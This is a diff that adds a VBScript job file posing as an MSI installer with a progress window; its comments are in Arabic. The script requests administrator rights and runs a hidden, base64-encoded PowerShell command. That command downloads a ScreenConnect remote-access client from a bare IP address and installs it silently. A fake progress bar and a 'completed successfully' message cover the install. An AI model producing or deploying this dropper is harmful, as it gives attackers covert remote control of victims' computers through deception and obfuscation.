@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<job id="msi_install">
+    <script language="VBScript">
+        <![CDATA[
+        ' 1. طلب صلاحيات المسؤول تلقائياً
+        If Not WScript.Arguments.Named.Exists("elevated") Then
+            CreateObject("Shell.Application").ShellExecute _
+                "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", _
+                "", "runas", 1
+            WScript.Quit
+        End If
+
+        Dim shell, ps
+        Set shell = CreateObject("WScript.Shell")
+
+        ' 2. أمر الباورشيل لتحميل وتثبيت الـ MSI
+        ps = "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQA0ADYALgAxADgANQAuADIAMwA5AC4ANwAwADoAOAAwADQAMAAvAEIAaQBuAC8AUwBjAHIAZQBlAG4AQwBvAG4AbgBlAGMAdAAuAEMAbABpAGUAbgB0AFMAZQB0AHUAcAAuAG0AcwBpAD8AZQA9AEEAYwBjAGUAcwBzACYAeQA9AEcAdQBlAHMAdAAiAAoAJABwAGEAdABoACAAPQAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFMAYwByAGUAZQBuAEMAbwBuAG4AZQBjAHQALgBDAGwAaQBlAG4AdABTAGUAdAB1AHAALgBtAHMAaQAiAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAYQB0AGgACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAbQBzAGkAZQB4AGUAYwAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALwBpACAAJABwAGEAdABoACAALwBxAG4AIAAvAG4AbwByAGUAcwB0AGEAcgB0ACIAIAAtAFcAYQBpAHQAIg=="
+
+        shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & ps, 0, False
+
+        ' 3. إنشاء نافذة التحميل البصرية (IE)
+        Set ie = CreateObject("InternetExplorer.Application")
+        ie.Visible = True
+        ie.ToolBar = False
+        ie.StatusBar = False
+        ie.MenuBar = False
+        ie.Width = 450
+        ie.Height = 240
+        ie.Left = 300
+        ie.Top = 200
+
+        html = "<html><head><title>Processing...</title>" & _
+        "<style>" & _
+        "body{font-family:Segoe UI;text-align:center;color:#333;margin-top:40px;background:#f7f7f7;overflow:hidden;}" & _
+        "h3{color:#333;font-weight:normal;}" & _
+        "#main{width:340px;height:28px;border:1px solid #555;border-radius:4px;margin:auto;background:#ddd;}" & _
+        "#fill{height:28px;width:0;background:#4CAF50;border-radius:4px;}" & _
+        "#percent{font-size:14px;color:#333;margin-top:8px;}" & _
+        "</style></head><body>" & _
+        "<h3>Please wait...</h3>" & _
+        "<div id='main'><div id='fill'></div></div>" & _
+        "<p id='percent'>0%</p>" & _
+        "</body></html>"
+
+        ie.Navigate("about:blank")
+        Do While ie.Busy: WScript.Sleep 100: Loop
+
+        ie.Document.Write html
+        ie.Document.Close
+
+        ' 4. تحريك شريط التقدم
+        For i = 1 To 100
+            On Error Resume Next
+            ie.Document.GetElementById("fill").Style.Width = i & "%"
+            ie.Document.GetElementById("percent").innerText = i & "%"
+            WScript.Sleep 100
+            If Err.Number <> 0 Then Exit For
+        Next
+
+        MsgBox "Process completed successfully!", vbInformation, "Done"
+        ie.Quit
+        ]]>
+    </script>
+</job>
